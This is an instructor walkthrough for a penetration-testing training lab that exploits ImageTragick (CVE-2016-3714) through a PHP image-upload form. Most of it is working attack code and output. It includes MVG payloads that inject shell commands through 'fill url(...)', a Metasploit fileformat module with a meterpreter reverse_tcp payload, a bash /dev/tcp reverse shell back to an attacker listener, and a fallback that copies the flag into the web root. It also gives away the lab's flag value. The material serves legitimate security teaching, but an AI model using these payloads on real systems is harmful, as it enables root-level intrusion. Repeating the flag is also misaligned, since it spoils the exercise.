---
id: B02.M09-walkthrough
title: Indianapolis — Instructor Walkthrough
artifact_type: activity_walkthrough
audience: instructor
block: B02
module_type: lab
legacy_aliases:
- legacy/week2/labs/pcte_vulnhub_targets/walkthroughs/10-target10-imagetragick.md
source_kind: markdown
render_mode: generate
source_status: authored
review_required: false
output_formats:
- docx
- pdf
sensitivity: instructor_only
references:
- path: ./answer-key.md
---

# Indianapolis — Instructor Walkthrough

## Objective and starting context

Live instructor demo for the Indianapolis Module (`B02.M09`). Students know only the assigned subnet `192.168.19.0/24`. Do not open with the product name, CVE, or host IP.

This walkthrough is rewritten onto the `192.168.19.0/24` student-facing range. Example host addresses in later steps use the `.10` (and, where present, `.11`) convention from the shared stack; treat those as discovered values, not pre-briefed facts.

The deploy flag key is `T10_FLAG`. Confirm the live `.env` value before grading.


## Required Tools
* `iproute2` (for adding static routes when your host has no path to the target subnet)
* `nmap` (for host discovery and port scanning)
* `curl` (HTTP headers and optional multipart uploads)
* a web browser (same uploads via the form on port 8080 — often the more natural path)
* `imagemagick` (`convert` / `identify` — optional; any tool that can create tiny PNG/GIF/JPG files works)
* `nc` (Netcat, for catching the reverse shell)
* `metasploit-framework` (section 4 — local ImageTragick fileformat module, then upload the generated file)

## 1. Network Routing & Host Discovery

At the start of this scenario, we only know the target subnet: `192.168.19.0/24`. We are positioned on the external lab network (`192.168.100.0/24`).

If your host does not already have a route into that Class C, add one via the lab router (address and path vary by deployment):

```bash
sudo ip route add 192.168.19.0/24 via 192.168.100.254
```

With connectivity available, find which addresses on the subnet actually answer. `nmap -sn` is a ping sweep: it checks host up/down and **does not** port-scan. That is cheaper than a full TCP scan of every IP, and we only have a subnet so far — we still need a live host before we care about services.

```bash
nmap -sn 192.168.19.0/24
```

*Output excerpt:*
```text
Nmap scan report for 192.168.19.10
Host is up (0.000014s latency).
```

**Observation:** One live host responds on this subnet: **192.168.19.10**.

**Inference:** Concentrate service enumeration on that address.

## 2. Service Enumeration

We have a candidate IP. Next question: **what is listening, and what does it claim to be?** That takes a version scan, not another ping sweep.

```bash
nmap -Pn -sV -p- 192.168.19.10
```

*Why these options:*

* `-Pn` — skip nmap’s host-discovery probes. We already know `192.168.19.10` responded to `-sn`. This also keeps the scan going if the host later ignores ping but still serves TCP.
* `-sV` — version detection. An open port labeled only `http` is not enough; we need the product string (here, **PHP 7.0.33** CLI server).
* `-p-` — all 65535 TCP ports, not nmap’s default top 1000. A single missed listener would hide the whole attack surface. On this host the extra cost is small.

*Output excerpt:*
```text
PORT     STATE SERVICE VERSION
8080/tcp open  http    PHP cli server 5.5 or later (PHP 7.0.33-0)
```

**Observation:** A single open port — **8080/tcp** — fingerprinted as a PHP built-in / CLI server (PHP 7.0.33).

**Inference:** A conventional web upload or form app is likely. Fetch the page with response headers before assuming any image library is involved.

### Initial Web Probing

nmap told us HTTP on **8080**. Confirm that with a normal GET — headers and the HTML form. This is ordinary recon `curl`, not an exploit.

```bash
curl -s -D - http://192.168.19.10:8080/ -o /tmp/t10-index.html | head -12
```

*Why this `curl`:*

* `-s` — silent; drop the progress meter.
* `-D -` — write response **headers** to stdout (`X-Powered-By`, status).
* `-o /tmp/t10-index.html` — write the **body** to a file.
* `| head -12` — only the first header lines.
* Use **`:8080`** because that is the listener nmap found (not 80).

You can also open `http://192.168.19.10:8080/` in a browser and view source; the form is the same.

*Header excerpt:*
```text
HTTP/1.1 200 OK
Host: 192.168.19.10:8080
Connection: close
X-Powered-By: PHP/7.0.33-0+deb9u10
Content-type: text/html; charset=UTF-8
```

*Body:*
```html
<form method="post" enctype="multipart/form-data">
    File: <input type="file" name="file_upload">
    <input type="submit">
</form>
```

**Observation:** A minimal multipart upload form with field name `file_upload`. No product banner names an image library.

**Inference:** The form itself does not prove how uploads are processed. Start with a non-image upload to learn the filter, then try common image types and watch the response.

### Observing Upload Processing

The page is a normal HTML file picker (`enctype="multipart/form-data"`, field name `file_upload`). Browsing to `http://192.168.19.10:8080/`, choosing a file, and submitting is the usual way to use it. The `curl -F` lines below are the same POST for a copy-paste walkthrough (`-F` builds a multipart form field; `file_upload=` matches the input name; `@path` is the file). Prefer the browser when you are sitting at a GUI.

Start with a non-image upload. Create `/tmp/probe.txt`, then **browse to the form and upload it**, or:

```bash
printf 'hello\n' > /tmp/probe.txt
curl -s -F 'file_upload=@/tmp/probe.txt;filename=probe.txt' \
  http://192.168.19.10:8080/
```

*Output:*
```text
Unsupported filetype uploaded.
```

**Observation:** `.txt` is rejected with an explicit filetype error.

**Inference:** The app enforces an allowlist (or denylist). A bare multipart upload form with no other UI strongly suggests image types next — try common extensions with **real** image bytes, not just renamed text.

A quick search for creating tiny test images turns up ImageMagick `convert` (any tool that writes a real PNG/GIF/JPG is fine):

```bash
convert -size 8x6 xc:blue  /tmp/sample.png
convert -size 8x6 xc:red   /tmp/sample.gif
convert -size 8x6 xc:green /tmp/sample.jpg
```

Upload each file through the **browser** (same form, three times), or loop `curl` so the three POSTs stay identical except for the extension — same idea as the T9 port loop:

```bash
for ext in png gif jpg; do
  echo "=== $ext ==="
  curl -s -F "file_upload=@/tmp/sample.${ext};filename=sample.${ext}" \
    http://192.168.19.10:8080/
  echo
done
```

*Output:*
```text
=== png ===
Image size is: 8 x 6
=== gif ===
Image size is: 8 x 6
=== jpg ===
Image size is: 8 x 6
```

**Observation:** `.png`, `.gif`, and `.jpg` are accepted, and every response reports **`Image size is: 8 x 6`** — matching the images we created.

**Inference:** The server is not only storing uploads. It **parses** accepted files and returns width × height. That is image-processing behavior (commonly ImageMagick [`identify`](https://imagemagick.org/script/identify.php) or similar), not a static file drop.

Contrast with a non-image body under an allowed extension. Save `/tmp/fake.png` (text inside, `.png` name), then **upload it in the browser**, or:

```bash
printf 'not an image\n' > /tmp/fake.png
curl -s -F 'file_upload=@/tmp/fake.png;filename=sample.png' \
  http://192.168.19.10:8080/
```

*Output:*
```text
Image size is:
```

**Observation:** The extension passes the filter, but dimensions are empty — the processor ran and failed to read geometry from the content.

**Inference:** Processing is content-aware. Next, probe whether the processor understands ImageMagick-specific formats when the filename still uses an allowed image extension.

### Probing ImageMagick-Style Input

Upload a harmless Magick Vector Graphics (MVG) body with a `.gif` filename. MVG is ImageMagick’s vector mini-language ([Magick Vector Graphics](https://imagemagick.org/script/mvg.php)).

Write it to a file named with an allowed extension, then **browse and upload `test.gif`**, or POST the same bytes with `curl` (`@-` means stdin; `filename=test.gif` is what the PHP allowlist sees):

```bash
cat > /tmp/test.gif <<'EOF'
push graphic-context
viewbox 0 0 640 480
pop graphic-context
EOF
```

```bash
curl -s -F 'file_upload=@/tmp/test.gif;filename=test.gif;type=image/png' \
  http://192.168.19.10:8080/
```

*Output:*
```text
Image size is: 640 x 480
```

**Observation:** The server returns `640 x 480` from the MVG `viewbox`, not from a raster file we uploaded. The parser understands vector directives such as `push graphic-context` and `viewbox`.

**Inference:** That output shape matches ImageMagick `identify` (commonly `-format '%w x %h'`). Searching with those facts — `ImageMagick identify "Image size is" upload RCE` or `ImageMagick MVG fill url delegate` — surfaces the ImageTragick class of issues.

The matching Vulhub reference for this lab target is `vulnhub/imagemagick/CVE-2016-3714/README.md` (the older `imagetragick` path redirects there).

## 3. Vulnerability Discovery

We now know:

* PHP upload form on **8080** (`file_upload`) with an extension allowlist (`.txt` rejected; `.png` / `.gif` / `.jpg` accepted)
* Accepted uploads are passed through an **`identify`-style** dimension probe
* MVG-style bodies are accepted when the filename ends in an allowed image extension such as `.gif`

Public write-ups of **ImageTragick ([CVE-2016-3714](https://nvd.nist.gov/vuln/detail/CVE-2016-3714))** describe insufficient filtering when ImageMagick passes filenames or URLs from crafted image content to delegate shell commands ([ImageTragick advisory](https://imagetragick.com/), [oss-security disclosure](https://www.openwall.com/lists/oss-security/2016/05/03/18)). MVG `fill 'url(...)'` directives are a common trigger path.

**Candidate selection:** Before trying generic PHP upload tricks (webshells, polyglots), test the ImageMagick delegate path first — we already have an `identify`-style response to MVG content, which is exactly the precondition in the public PoCs.

First confirm the PHP extension filter blocks a non-image name. Write the PoC to `exploit.mvg`, then **browse to the form and upload that file**, or:

```bash
cat > /tmp/exploit.mvg <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|id; " )'
pop graphic-context
EOF

curl -s -F 'file_upload=@/tmp/exploit.mvg;filename=exploit.mvg;type=text/plain' \
  http://192.168.19.10:8080/
```

*Output:*
```text
Unsupported filetype uploaded.
```

*What we learned:* the PHP layer checks the **filename extension** before ImageMagick sees the body. Use an allowed extension such as `.gif`, even when the body is MVG-style content — the same bypass noted on [imagetragick.com](https://imagetragick.com/) ("rename `exploit.mvg` to `exploit.jpg`").

### Test the public PoC

Use the well-known public PoC pattern instead (Vulhub README / [ImageTragick PoCs](https://github.com/ImageTragick/PoCs)): upload MVG with an allowed image extension and inject a shell command through `fill 'url(...)'`.

Write that PoC to **`exploit.gif`** (allowed extension, MVG body). **Browse to the form and upload `exploit.gif`**, or:

```bash
cat > /tmp/exploit.gif <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|id > /var/www/html/proof.txt; " )'
pop graphic-context
EOF

curl -s -F 'file_upload=@/tmp/exploit.gif;filename=exploit.gif;type=image/gif' \
  http://192.168.19.10:8080/
```

*Output:*
```text
Image size is: 640 x 480
```

Retrieve the proof file:

```bash
curl -s http://192.168.19.10:8080/proof.txt
```

*Output:*
```text
uid=0(root) gid=0(root) groups=0(root)
```

**Observation:** The uploaded file was parsed by ImageMagick, the delegate command was invoked, and the injected command ran as root.

That confirms **CVE-2016-3714**. Section 4 uses Metasploit only to **build** a malicious image on Kali; you still upload it through the same form. Section 5 is a reverse shell without Metasploit.

## 4. Automated Path: Metasploit (fileformat → upload)

`search imagetragick` / `search cve:2016-3714` finds `exploit/unix/fileformat/imagemagick_delegate`. That module writes a malicious image **on the attacker machine**. It does not HTTP-POST to this PHP form. Generate the file, start a handler (the fileformat module sets `DisablePayloadHandler`, so it will not catch the callback itself), then upload `msf.png` through the **browser** or with `curl`.

```bash
msfconsole -q
```

```text
msf6 > search imagetragick

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  --------  -----  -----------
   0  exploit/unix/fileformat/imagemagick_delegate     2016-05-03       excellent  No     ImageMagick Delegate Arbitrary Command Execution
```

```text
msf6 > use exploit/unix/fileformat/imagemagick_delegate
msf6 exploit(unix/fileformat/imagemagick_delegate) > show targets

Exploit targets:
   Id  Name
   --  ----
   0   SVG file
   1   MVG file
   2   PS file
```

Target **0** is SVG, **1** is MVG (same vector as the public PoC), **2** is PostScript. The default `FILENAME` is **`msf.png`** for all of them — ImageMagick keys off file magic, not the extension, and `.png` already matches this form’s allowlist. Use TARGET **1**.

```text
msf6 exploit(unix/fileformat/imagemagick_delegate) > set TARGET 1
msf6 exploit(unix/fileformat/imagemagick_delegate) > set payload cmd/unix/php/meterpreter/reverse_tcp
msf6 exploit(unix/fileformat/imagemagick_delegate) > set LHOST 192.168.100.1
msf6 exploit(unix/fileformat/imagemagick_delegate) > set LPORT 4444
msf6 exploit(unix/fileformat/imagemagick_delegate) > run
[+] msf.png stored at /home/kali/.msf4/local/msf.png
```

Start the handler in another `msfconsole`, or `use exploit/multi/handler` in the same session after the file is written. Match payload, `LHOST`, and `LPORT` to the fileformat settings:

```text
msf6 exploit(unix/fileformat/imagemagick_delegate) > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload cmd/unix/php/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 192.168.100.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
```

Upload `/home/kali/.msf4/local/msf.png` through the form in a **browser**, or:

```bash
curl -s -F 'file_upload=@/home/kali/.msf4/local/msf.png;filename=msf.png;type=image/png' \
  http://192.168.19.10:8080/
```

*Handler excerpt:*
```text
[*] Started reverse TCP handler on 192.168.100.1:4444
[*] Sending stage (45739 bytes) to 192.168.19.10
[*] Meterpreter session 1 opened (192.168.100.1:4444 -> 192.168.19.10:39298)

meterpreter > cat /flag.txt
silver-osprey
```

That is a complete automated path to the flag.

## 5. Manual Path: reverse shell

With command execution confirmed (`proof.txt` or the MSF session), you can also catch a bash reverse shell without Metasploit. Use your attacker IP on the lab-facing LAN (example `192.168.100.1`).

Start a Netcat listener:

```bash
nc -lvnp 4444
```

Write the MVG payload to `shell.gif` (unquoted heredoc so `$LHOST` / `$LPORT` expand), then **browse to the form and upload `shell.gif`**, or:

```bash
LHOST="192.168.100.1"
LPORT="4444"

cat > /tmp/shell.gif <<EOF
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|bash -c "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" & " )'
pop graphic-context
EOF

curl -s --max-time 15 -F 'file_upload=@/tmp/shell.gif;filename=shell.gif;type=image/gif' \
  http://192.168.19.10:8080/
```

The background `&` is important. It lets the delegate command return control while the reverse shell stays connected. `--max-time` keeps `curl` from hanging if the HTTP handler waits on the delegate.

Check your Netcat listener. You should receive a root shell:

```text
listening on [any] 4444 ...
connect to [192.168.100.1] from (UNKNOWN) [192.168.19.10] 49804
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@6481627ff596:/var/www/html#
```

This is **remote code execution** as root through ImageMagick delegate command injection.

### Failed Attempt: Reverse Shell Without Backgrounding

If you omit the trailing `&` from the injected command, the HTTP upload request may hang while the shell remains attached to the ImageMagick delegate process.

*What we learned:* Keep the reverse shell backgrounded inside the injected command. Your Netcat listener is the interactive session; the `curl` terminal does not need to remain clean.

### Failed Attempt: Overcomplicated Quoting

ImageTragick payloads are sensitive to local shell quoting, PHP multipart parsing, ImageMagick syntax, and delegate-shell parsing. If a payload fails silently, simplify it back to a one-command proof such as:

```bash
fill 'url(https://127.0.0.0/oops.jpg"|id > /var/www/html/proof.txt; " )'
```

*What we learned:* Prove command execution with a file write first, then move to the reverse shell once the delegate-injection syntax is correct.

## 6. Retrieve the Flag

With root shell access, read the flag directly from the container filesystem:

```bash
cat /flag.txt
```

*Output:*
```text
silver-osprey
```

### Fallback: No Interactive Shell

If a reverse shell does not connect, copy the flag into the web root. Save as `flagread.gif` and **upload it in the browser**, or:

```bash
cat > /tmp/flagread.gif <<'EOF'
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|cp /flag.txt /var/www/html/flag.txt; " )'
pop graphic-context
EOF

curl -s -F 'file_upload=@/tmp/flagread.gif;filename=flagread.gif;type=image/gif' \
  http://192.168.19.10:8080/

curl -s http://192.168.19.10:8080/flag.txt
```

*Output:*
```text
silver-osprey
```

Use the fallback only when an interactive shell is impractical. For this target, a shell is realistic and should be the preferred path.

Target 10 is complete.
